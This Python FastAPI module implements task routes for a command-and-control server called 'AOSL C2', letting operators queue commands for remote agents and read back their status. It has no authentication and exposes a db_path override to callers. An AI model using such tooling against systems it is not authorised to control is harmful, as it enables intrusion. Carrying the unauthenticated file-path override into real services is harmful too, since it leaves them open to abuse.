"""Task management and dispatch API routes for AOSL C2.

Allows operators to dispatch commands to agents, list queued tasks,
and query task status and execution results.
"""

import time
import uuid
from typing import Dict, Any, Optional, List
from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel

from db.database import get_db

router = APIRouter(prefix="/api/v1", tags=["Tasks"])


class TaskCreateRequest(BaseModel):
    """Payload model for creating and dispatching a task to an agent."""
    agent_id: Any
    command: str


@router.post("/task/new")
def create_task(
    req: TaskCreateRequest,
    db_path: Optional[str] = None
) -> Dict[str, Any]:
    """Dispatch a new command task to a target agent.

    Args:
        req: Task creation request with target agent_id and command string.
        db_path: Optional SQLite database file path override.

    Returns:
        Dict[str, Any]: Confirmation message and created task_id.

    Raises:
        HTTPException: 400 if agent_id or command is missing.
    """
    if req.agent_id is None or not req.command:
        raise HTTPException(status_code=400, detail="agent_id and command required")

    task_uuid = str(uuid.uuid4())
    now = time.time()

    with get_db(db_path) as conn:
        cur = conn.execute(
            """
            INSERT INTO tasks (task_id, agent_id, command, status, created_at, updated_at)
            VALUES (?, ?, ?, 'pending', ?, ?)
            """,
            (task_uuid, str(req.agent_id), req.command, now, now)
        )
        return {
            "message": "Task created",
            "task_id": cur.lastrowid,
            "task_uuid": task_uuid
        }


@router.get("/task/list")
def list_tasks(db_path: Optional[str] = None) -> Dict[str, List[Dict[str, Any]]]:
    """List all tasks across all agents in the C2 system.

    Args:
        db_path: Optional SQLite database file path override.

    Returns:
        Dict[str, List[Dict[str, Any]]]: Dictionary containing list of all tasks.
    """
    with get_db(db_path) as conn:
        cur = conn.execute("SELECT * FROM tasks ORDER BY created_at DESC")
        tasks = [dict(r) for r in cur.fetchall()]
        return {"tasks": tasks}


@router.get("/task/taskinfobyid")
def get_task_info(
    taskid: Optional[int] = Query(None),
    id: Optional[int] = Query(None),
    db_path: Optional[str] = None
) -> Dict[str, Any]:
    """Retrieve detailed information and execution status for a task by ID.

    Args:
        taskid: Task database ID query parameter.
        id: Alternative ID query parameter.
        db_path: Optional SQLite database file path override.

    Returns:
        Dict[str, Any]: Task detail dictionary.

    Raises:
        HTTPException: 400 if task ID missing, 404 if task not found.
    """
    tid = taskid if taskid is not None else id
    if tid is None:
        raise HTTPException(status_code=400, detail="Task ID required")

    with get_db(db_path) as conn:
        cur = conn.execute("SELECT * FROM tasks WHERE id = ?", (tid,))
        row = cur.fetchone()
        if not row:
            raise HTTPException(status_code=404, detail="Task not found")
        return dict(row)
